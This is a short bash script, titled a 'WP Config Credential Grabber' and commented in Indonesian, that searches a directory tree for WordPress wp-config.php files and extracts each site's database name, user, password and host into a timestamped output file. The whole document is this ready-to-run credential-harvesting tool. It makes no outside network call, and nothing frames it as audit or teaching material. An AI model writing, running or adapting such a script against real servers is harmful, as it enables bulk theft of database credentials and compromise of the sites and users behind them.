#!/bin/bash
# a.sh — WP Config Credential Grabber
# Usage: a.sh /www/html/

TARGET="${1:-.}"
OUTPUT="wp_creds_$(date +%Y%m%d_%H%M%S).txt"

if [[ ! -d "$TARGET" ]]; then
    echo "[!] Path tidak valid: $TARGET"
    exit 1
fi

echo "[*] Scanning: $TARGET"
echo "[*] Output  : $OUTPUT"
echo ""

FOUND=0

while IFS= read -r -d '' CONFIG; do
    # Ekstrak 4 define yang diinginkan
    DB_NAME=$(grep -oP "define\(\s*'DB_NAME'\s*,\s*'\K[^']+" "$CONFIG")
    DB_USER=$(grep -oP "define\(\s*'DB_USER'\s*,\s*'\K[^']+" "$CONFIG")
    DB_PASS=$(grep -oP "define\(\s*'DB_PASSWORD'\s*,\s*'\K[^']*" "$CONFIG")
    DB_HOST=$(grep -oP "define\(\s*'DB_HOST'\s*,\s*'\K[^']+" "$CONFIG")

    # Kalau minimal DB_USER ketemu, anggap valid
    if [[ -n "$DB_USER" ]]; then
        FOUND=$((FOUND + 1))
        {
            echo "========================================"
            echo "PATH : $CONFIG"
            echo "========================================"
            echo "define( 'DB_NAME',     '$DB_NAME' );"
            echo "define( 'DB_USER',     '$DB_USER' );"
            echo "define( 'DB_PASSWORD', '$DB_PASS' );"
            echo "define( 'DB_HOST',     '$DB_HOST' );"
            echo ""
        } | tee -a "$OUTPUT"
    fi

done < <(find "$TARGET" -name "wp-config.php" -print0 2>/dev/null)

echo "[+] Selesai. $FOUND wp-config.php ditemukan."
echo "[+] Hasil disimpan di: $OUTPUT"
